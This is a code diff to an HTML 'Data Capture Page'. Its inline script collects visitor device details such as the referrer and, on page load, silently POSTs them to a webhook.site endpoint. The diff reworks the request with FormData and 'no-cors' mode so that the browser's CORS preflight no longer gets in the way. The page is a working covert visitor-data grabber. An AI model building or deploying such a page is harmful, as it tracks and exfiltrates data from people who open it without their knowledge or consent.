@@ -7,8 +7,8 @@
     <h1>Data Capture Page</h1>
 
     <script>
-        // Your Webhook URL with CORS Proxy
-        const webhookURL = "https://cors-anywhere.herokuapp.com/https://webhook.site/03405ae5-bd8a-4ab8-af4b-feda3be9176d";
+        // Direct Webhook URL
+        const webhookURL = "https://webhook.site/03405ae5-bd8a-4ab8-af4b-feda3be9176d";
 
         // Gather device information
         const deviceInfo = {
@@ -19,19 +19,23 @@
             referrer: document.referrer
         };
 
-        // Send POST request to webhook using proxy
+        // Avoid CORS Preflight by using FormData
+        const formData = new FormData();
+        for (const key in deviceInfo) {
+            formData.append(key, deviceInfo[key]);
+        }
+
+        // Send POST request using FormData
         fetch(webhookURL, {
             method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(deviceInfo)
+            body: formData,
+            mode: "no-cors", // Disable CORS enforcement
         })
         .then(response => {
-            console.log("Data Sent Successfully:", response);
+            console.log("Data Sent Successfully", response);
         })
         .catch(error => {
-            console.error("Error Sending Data:", error);
+            console.error("Error Sending Data", error);
         });
     </script>
 </body>
